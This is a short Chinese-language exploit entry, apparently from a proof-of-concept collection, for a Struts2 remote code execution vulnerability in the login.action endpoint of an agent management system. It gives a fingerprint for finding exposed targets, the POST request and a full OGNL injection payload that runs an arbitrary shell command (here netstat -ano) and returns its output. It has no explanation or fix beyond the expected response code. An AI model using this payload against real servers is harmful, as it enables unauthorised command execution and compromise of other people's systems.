# 代理商管理系统login.action存在Struts2远程代码执行漏洞

代理商管理系统 ｜ 命令执行 ｜ —
- **指纹**：`body="AgentSyste代理商管理系统"`
- **请求**：`POST /login.action HTTP/1.1`

**Payload**
```
debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):xx.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=webpath123456&command=netstat%20-ano
```
- **响应特征**：200